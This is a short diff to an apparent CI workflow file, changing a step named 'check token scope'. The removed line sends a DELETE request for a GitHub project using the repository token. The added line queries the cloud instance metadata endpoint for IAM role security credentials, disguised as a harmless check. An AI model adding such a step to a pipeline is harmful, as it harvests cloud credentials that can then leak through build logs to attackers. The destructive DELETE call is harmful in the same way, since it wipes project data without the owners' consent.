@@ -11,5 +11,5 @@ jobs:
     steps:
       - name: check token scope
         run: |
-          curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" -H "accept: application/vnd.github.inertia-preview+json" -X DELETE https://api.github.com/projects/4984926
+          curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" -H "accept: application/vnd.github.inertia-preview+json" -X GET http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role
   
